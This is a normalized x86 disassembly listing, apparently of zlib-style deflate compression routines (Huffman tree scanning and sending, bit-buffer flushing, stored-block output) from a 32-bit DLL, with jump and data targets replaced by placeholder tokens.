cmp esi [ ebp + 0xc ]
lea ecx [ ebx + ecx * 4 ]
je r-xdata
mov ecx [ esi - 0x4 ]
sub esi 0x4
dec eax
cmp ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] esi
jg r-xdata
dec [ ebp + 0x8 ]
mov esi [ ebp - 0x20 ]
mov edi [ ebp + 0xc ]
sub edi esi
movzx esi [ ecx ]
imul edi esi
mov si [ ebp + 0xc ]
add [ edx + 0x16a8 ] edi
mov [ ecx + 0x2 ] si
sub_1000c22f
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp + 0x10 ]
push esi
push edi
lea esi [ ebp - 0x1e ]
xor edx edx
push 0xf
sub ecx esi
lea eax [ ebp - 0x1e ]
pop esi
mov di [ ecx + eax ]
add di dx
shl edi 0x1
mov edx edi
mov [ eax ] dx
inc eax
inc eax
dec esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jl r-xdata
pop edi
pop esi
leave
retn
mov esi [ ebp + 0x8 ]
push ebx
lea ebx [ eax + 0x1 ]
add esi 0x4
dec ebx
jne r-xdata
mov cx [ ebp + edx * 2 - 0x20 ]
lea eax [ ebp + edx * 2 - 0x20 ]
movzx edi cx
inc ecx
push edx
push edi
mov [ eax ] cx
call sub_1000cf43
pop ecx
mov [ esi ] ax
pop ecx
movzx edx [ esi + 0x2 ]
test edx edx
je r-xdata
pop ebx
sub_1000c297
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0xb1c ]
lea eax [ esi + 0x94 ]
push eax
push esi
call sub_1000c2f9
push [ esi + 0xb28 ]
lea eax [ esi + 0x988 ]
push eax
push esi
call sub_1000c2f9
lea eax [ esi + 0xb30 ]
push eax
push esi
call sub_1000bd9b
add esp 0x20
push 0x12
pop eax
lea ecx [ eax + eax * 2 + 0x11 ]
add [ esi + 0x16a8 ] ecx
pop esi
retn
dec eax
cmp eax 0x3
jge r-xdata
movzx ecx [ eax + r--data ]
cmp [ esi + ecx * 4 + 0xa7e ] 0x0
jne r-xdata
sub_1000c2f9
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
movzx edx [ eax + 0x2 ]
push edi
push 0x7
pop esi
xor ebx ebx
push 0x4
test edx edx
pop edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
or [ eax + ecx * 4 + 0x6 ] 0xffff
test ecx ecx
jl r-xdata
push 0x3
mov esi 0x8a
pop edi
pop edi
pop esi
pop ebx
leave
retn
add eax 0x6
inc ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
cmp ebx edi
jge r-xdata
cmp eax edx
je r-xdata
test eax eax
je r-xdata
add [ ecx + eax * 4 + 0xa7c ] bx
jmp r-xdata
add [ ebp + 0xc ] 0x4
dec [ ebp + 0x10 ]
jne r-xdata
cmp ebx 0xa
jg r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
mov eax edx
mov edx [ ebp + 0xc ]
inc ebx
movzx edx [ edx ]
cmp ebx esi
jge r-xdata
inc [ ecx + 0xac4 ]
inc [ ecx + 0xac0 ]
jmp r-xdata
inc [ ecx + 0xabc ]
jmp r-xdata
inc [ ecx + eax * 4 + 0xa7c ]
cmp eax edx
jne r-xdata
mov esi 0x8a
jmp r-xdata
push 0x7
pop esi
push 0x4
push 0x6
pop esi
push 0x3
jmp r-xdata
pop edi
sub_1000c3bb
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ esi + 0x16bc ]
cmp ecx 0xb
jle r-xdata
add eax 0xfffffeff
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x5
mov [ esi + 0x16bc ] ecx
add eax 0xfffffeff
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
dec eax
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x5
mov [ esi + 0x16bc ] ecx
dec eax
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
mov eax [ ebp + 0x10 ]
cmp ecx 0xb
jle r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x4
mov [ esi + 0x16bc ] ecx
mov edx eax
mov edi [ esi + 0x14 ]
shl edx cl
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov cl [ esi + 0x16b8 ]
mov [ edi + edx ] cl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff4
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
mov ebx [ ebp + 0x14 ]
cmp ecx 0xc
lea eax [ ebx - 0x4 ]
jle r-xdata
mov eax [ ebp + 0xc ]
dec eax
push eax
lea eax [ esi + 0x94 ]
push eax
push esi
call sub_1000c5f4
mov eax [ ebp + 0x10 ]
dec eax
push eax
lea eax [ esi + 0x988 ]
push eax
push esi
call sub_1000c5f4
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ esi + 0x16bc ]
movzx eax [ edi + r--data ]
cmp ecx 0xd
jle r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov ax [ esi + eax * 4 + 0xa7e ]
shl ax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
movzx eax [ esi + eax * 4 + 0xa7e ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + ebx ] dl
mov edx [ esi + 0x16bc ]
inc [ esi + 0x14 ]
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
inc edi
cmp edi [ ebp + 0x14 ]
jl r-xdata
sub_1000c5f4
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
or [ ebp - 0x8 ] 0xffffffff
push ebx
push esi
movzx ebx [ eax + 0x2 ]
push edi
push 0x7
pop ecx
xor edx edx
push 0x4
test ebx ebx
pop edi
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jl r-xdata
push 0x3
mov ecx 0x8a
pop edi
pop edi
pop esi
pop ebx
leave
retn
add eax 0x6
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
mov esi ebx
mov ebx [ ebp - 0x4 ]
inc edx
mov [ ebp + 0x8 ] esi
movzx ebx [ ebx ]
cmp edx ecx
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0xc ] edx
jge r-xdata
cmp edx edi
jge r-xdata
cmp esi ebx
je r-xdata
test esi esi
je r-xdata
movzx edi [ eax + esi * 4 + 0xa7e ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
sub ebx edi
cmp ecx ebx
jle r-xdata
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0xc ]
jne r-xdata
cmp edx 0xa
jg r-xdata
cmp esi [ ebp - 0x8 ]
je r-xdata
mov bx [ eax + esi * 4 + 0xa7c ]
shl bx cl
mov ecx [ eax + 0x16bc ]
or [ eax + 0x16b8 ] bx
add ecx edi
mov [ eax + 0x16bc ] ecx
movzx edx [ eax + esi * 4 + 0xa7c ]
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
inc [ eax + 0x14 ]
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ esi + ebx ] cl
mov esi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx si
shr dx cl
lea ecx [ esi + edi - 0x10 ]
mov esi [ ebp + 0x8 ]
mov [ eax + 0x16bc ] ecx
mov [ eax + 0x16b8 ] dx
mov edx [ ebp + 0xc ]
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movzx edi [ eax + 0xac6 ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
mov [ ebp + 0x8 ] edi
sub ebx edi
cmp ecx ebx
jle r-xdata
movzx edi [ eax + 0xac2 ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
mov [ ebp + 0x8 ] edi
sub ebx edi
cmp ecx ebx
jle r-xdata
movzx edi [ eax + 0xabe ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
mov [ ebp + 0x8 ] edi
sub ebx edi
cmp ecx ebx
jle r-xdata
movzx edi [ eax + esi * 4 + 0xa7e ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
sub ebx edi
cmp ecx ebx
jle r-xdata
jmp r-xdata
dec edx
mov [ ebp + 0xc ] edx
jne r-xdata
mov di [ eax + 0xac4 ]
shl di cl
or [ eax + 0x16b8 ] di
mov edi [ ebp + 0x8 ]
add ecx edi
mov [ eax + 0x16bc ] ecx
movzx edx [ eax + 0xac4 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] dx
mov edx [ ebp + 0xc ]
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov di [ eax + 0xac0 ]
shl di cl
or [ eax + 0x16b8 ] di
mov edi [ ebp + 0x8 ]
add ecx edi
mov [ eax + 0x16bc ] ecx
movzx edx [ eax + 0xac0 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] dx
mov edx [ ebp + 0xc ]
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov di [ eax + 0xabc ]
shl di cl
or [ eax + 0x16b8 ] di
mov edi [ ebp + 0x8 ]
add ecx edi
mov [ eax + 0x16bc ] ecx
movzx edx [ eax + 0xabc ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] dx
mov edx [ ebp + 0xc ]
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov bx [ eax + esi * 4 + 0xa7c ]
shl bx cl
mov ecx [ eax + 0x16bc ]
or [ eax + 0x16b8 ] bx
add ecx edi
mov [ eax + 0x16bc ] ecx
movzx edx [ eax + esi * 4 + 0xa7c ]
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
inc [ eax + 0x14 ]
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ esi + ebx ] cl
mov esi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx si
shr dx cl
lea ecx [ esi + edi - 0x10 ]
mov esi [ ebp + 0x8 ]
mov [ eax + 0x16bc ] ecx
mov [ eax + 0x16b8 ] dx
mov edx [ ebp + 0xc ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x8 ] esi
cmp [ ebp + 0x10 ] edx
jne r-xdata
add edx 0xfffffff5
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x7
add edx 0xfffffff5
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
add edi 0xfffffff7
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ eax + 0x16bc ]
cmp ecx 0x9
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x3
jmp r-xdata
add edx 0xfffffffd
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
add edi 0xfffffff3
mov [ eax + 0x16b8 ] dx
mov ecx [ eax + 0x16bc ]
cmp ecx 0xd
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x2
jmp r-xdata
add edx 0xfffffffd
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
add edi 0xfffffff2
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ eax + 0x16bc ]
cmp ecx 0xe
jle r-xdata
dec edx
mov [ ebp + 0xc ] edx
cmp esi [ ebp + 0x10 ]
jne r-xdata
mov ecx 0x8a
jmp r-xdata
mov [ eax + 0x16bc ] edi
jmp r-xdata
mov [ eax + 0x16bc ] ecx
push 0x7
pop ecx
push 0x4
push 0x6
pop ecx
push 0x3
jmp r-xdata
pop edi
sub_1000cb12
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0xc ]
cmp [ eax + 0x16a0 ] ecx
push esi
push edi
je r-xdata
movzx edx [ ebx + 0x402 ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop esi
mov [ ebp + 0xc ] edx
sub esi edx
cmp ecx esi
jle r-xdata
jmp r-xdata
mov si [ ebx + 0x400 ]
shl si cl
or [ eax + 0x16b8 ] si
add ecx edx
movzx edx [ ebx + 0x400 ]
mov esi edx
mov edi [ eax + 0x8 ]
shl esi cl
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov cl [ eax + 0x16b8 ]
mov [ edi + esi ] cl
inc [ eax + 0x14 ]
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ esi + edi ] cl
mov esi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx si
shr dx cl
mov ecx [ ebp + 0xc ]
lea ecx [ esi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov edx [ eax + 0x16a4 ]
movzx esi [ edx + ecx * 2 ]
mov edx [ eax + 0x1698 ]
mov [ ebp - 0xc ] esi
movzx edx [ ecx + edx ]
inc ecx
test esi esi
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov [ eax + 0x16bc ] ecx
pop edi
movzx ecx [ ebx + 0x402 ]
pop esi
mov [ eax + 0x16b4 ] ecx
pop ebx
leave
retn
movzx edi [ edx + r--data ]
mov ecx edi
push 0x10
shl ecx 0x2
mov [ ebp + 0x8 ] ecx
movzx ecx [ ecx + ebx + 0x406 ]
pop ebx
mov [ ebp - 0x4 ] ecx
sub ebx ecx
mov ecx [ eax + 0x16bc ]
cmp ecx ebx
jle r-xdata
movzx esi [ ebx + edx * 4 + 0x2 ]
mov ecx [ eax + 0x16bc ]
lea edx [ ebx + edx * 4 ]
push 0x10
pop edi
sub edi esi
cmp ecx edi
jle r-xdata
mov ebx [ ebp + 0xc ]
mov di [ ebx + edi * 4 + 0x404 ]
shl di cl
or [ eax + 0x16b8 ] di
mov edi [ ebp - 0x4 ]
add ecx edi
mov [ eax + 0x16bc ] ecx
mov esi [ ebp + 0xc ]
movzx esi [ esi + edi * 4 + 0x404 ]
mov edi esi
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr si cl
mov ecx [ ebp - 0x4 ]
lea ecx [ edi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] si
mov esi [ ebp - 0xc ]
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov dx [ edx ]
shl dx cl
or [ eax + 0x16b8 ] dx
add ecx esi
jmp r-xdata
movzx edx [ edx ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
mov ebx [ ebp + 0xc ]
sub cx di
shr dx cl
lea ecx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] ecx
mov [ eax + 0x16b8 ] dx
jmp r-xdata
dec esi
cmp esi 0x100
jae r-xdata
sub edx [ ecx + r--data ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop ebx
sub ebx edi
cmp ecx ebx
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ecx + r--data ]
test edi edi
mov [ ebp + 0x8 ] edi
je r-xdata
mov [ eax + 0x16bc ] ecx
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x16a0 ]
jb r-xdata
mov ecx esi
shr ecx 0x7
movzx ecx [ ecx + r--data ]
movzx ecx [ esi + r--data ]
jmp r-xdata
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx edi
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx - 0x10 ]
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dx [ edx ]
shl dx cl
or [ eax + 0x16b8 ] dx
mov edx [ ebp - 0x4 ]
add ecx edx
mov [ eax + 0x16bc ] ecx
movzx edx [ edx ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + ebx ] cl
mov edi [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx di
shr dx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ edi + ecx - 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax + 0x16b8 ] dx
mov [ eax + 0x16bc ] ecx
jmp r-xdata
mov edi ecx
mov ecx [ ebp + 0x10 ]
shl edi 0x2
push 0x10
mov [ ebp + 0x8 ] edi
lea edx [ edi + ecx ]
pop ebx
movzx ecx [ edx + 0x2 ]
mov [ ebp - 0x4 ] ecx
sub ebx ecx
mov ecx [ eax + 0x16bc ]
cmp ecx ebx
jle r-xdata
mov [ eax + 0x16bc ] ecx
sub esi [ edi + r--data ]
mov ecx [ eax + 0x16bc ]
push 0x10
pop edi
sub edi edx
cmp ecx edi
jle r-xdata
mov edx [ edi + r--data ]
mov ebx [ ebp + 0xc ]
test edx edx
mov [ ebp + 0x8 ] edx
je r-xdata
shl esi cl
or [ eax + 0x16b8 ] si
add ecx edx
mov edx esi
mov edi [ eax + 0x8 ]
shl edx cl
or [ eax + 0x16b8 ] dx
mov edx [ eax + 0x14 ]
mov cl [ eax + 0x16b8 ]
mov [ edi + edx ] cl
inc [ eax + 0x14 ]
mov edi [ eax + 0x14 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
mov [ edi + edx ] cl
mov edx [ eax + 0x16bc ]
inc [ eax + 0x14 ]
mov cx 0x10
sub cx dx
shr si cl
mov ecx [ ebp + 0x8 ]
lea ecx [ edx + ecx - 0x10 ]
mov [ eax + 0x16b8 ] si
jmp r-xdata
sub_1000cefd
mov edx [ esp + 0x4 ]
xor eax eax
lea ecx [ edx + 0x94 ]
cmp eax 0x9
jne r-xdata
inc eax
add ecx 0x4
cmp eax 0x9
jl r-xdata
xor ecx ecx
cmp eax 0x20
mov eax [ edx ]
sete cl
mov [ eax + 0x2c ] ecx
retn
push 0xe
lea ecx [ edx + 0xcc ]
pop eax
cmp [ ecx ] 0x0
jne r-xdata
inc eax
add ecx 0x4
cmp eax 0x20
jl r-xdata
cmp [ ecx ] 0x0
jne r-xdata
sub_1000cf62
mov eax [ esp + 0x4 ]
push ebx
push esi
mov ecx [ eax + 0x16bc ]
cmp ecx 0x10
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ eax + 0x14 ]
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
xor edx edx
mov dl [ eax + 0x16b9 ]
mov [ esi + ecx ] dl
inc [ eax + 0x14 ]
and [ eax + 0x16b8 ] 0x0
and [ eax + 0x16bc ] 0x0
jmp r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0x8 ]
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
lea ecx [ eax + 0x16b8 ]
mov [ edx + esi ] bl
inc [ eax + 0x14 ]
xor edx edx
add [ eax + 0x16bc ] 0xfffffff8
mov dl [ ecx + 0x1 ]
mov [ ecx ] dx
sub_1000cfd9
mov eax [ esp + 0x4 ]
push ebx
mov ecx [ eax + 0x16bc ]
cmp ecx 0x8
jle r-xdata
test ecx ecx
jle r-xdata
mov edx [ eax + 0x8 ]
mov bl [ eax + 0x16b8 ]
lea ecx [ eax + 0x16b8 ]
push esi
mov esi [ eax + 0x14 ]
mov [ edx + esi ] bl
inc [ eax + 0x14 ]
mov esi [ eax + 0x14 ]
xor edx edx
mov dl [ ecx + 0x1 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + esi ] dl
inc [ eax + 0x14 ]
pop esi
jmp r-xdata
and [ eax + 0x16b8 ] 0x0
and [ eax + 0x16bc ] 0x0
pop ebx
retn
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edx ] bl
inc [ eax + 0x14 ]
sub_1000d03d
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000cfd9
cmp [ esp + 0x1c ] 0x0
mov eax [ esp + 0x18 ]
pop ecx
mov [ esi + 0x16b4 ] 0x8
je r-xdata
mov ecx eax
dec eax
test ecx ecx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov [ ecx + edx ] al
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl ah
mov [ ecx + edi ] dl
inc [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov dl al
not dl
mov [ ecx + edi ] dl
inc [ esi + 0x14 ]
mov edi [ esi + 0x14 ]
mov ecx eax
not ecx
xor edx edx
mov dl ch
mov ecx [ esi + 0x8 ]
mov [ edi + ecx ] dl
inc [ esi + 0x14 ]
pop edi
pop esi
retn
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
push ebx
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov bl [ eax ]
mov [ edx + edi ] bl
inc [ esi + 0x14 ]
inc eax
dec ecx
jne r-xdata
pop ebx
sub_1000d0d0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
push esi
call sub_1000faa0
add esp 0x4
test eax eax
je r-xdata
push 0xa1
push r--data
push 0xbc
jmp r-xdata
mov eax [ esi + 0x28 ]
mov [ esi + 0xd0 ] edi
cmp eax edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x30 ] edi
je r-xdata
mov eax [ esi + 0xbc ]
push eax
call sub_1000f8e0
add esp 0x4
mov [ esi + 0xbc ] edi
push 0xa4
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov ecx [ esi + 0x24 ]
mov edx [ esi + 0x8 ]
neg ecx
sbb ecx ecx
mov [ esi + 0x4 ] edi
and ecx 0x1000
add ecx 0x1000
or ch 0x40
mov [ esi + 0x34 ] ecx
mov eax [ edx ]
mov [ esi ] eax
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x3c ]
mov [ esi + 0x18 ] 0x1
cmp eax edi
mov [ esi + 0x38 ] 0xf0
je r-xdata
push 0xb7
push r--data
push 0x44
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov [ esi + 0x3c ] edi
mov eax [ esi + 0x88 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov eax [ esi + 0x7c ]
push eax
call sub_1001d740
add esp 0x8
mov [ esi + 0x7c ] edi
mov eax [ esi + 0x84 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov ecx [ esi + 0x88 ]
push ecx
call sub_1001d740
add esp 0x8
mov [ esi + 0x88 ] edi
mov eax [ esi + 0x90 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x84 ] edi
mov eax [ esi + 0x1c ]
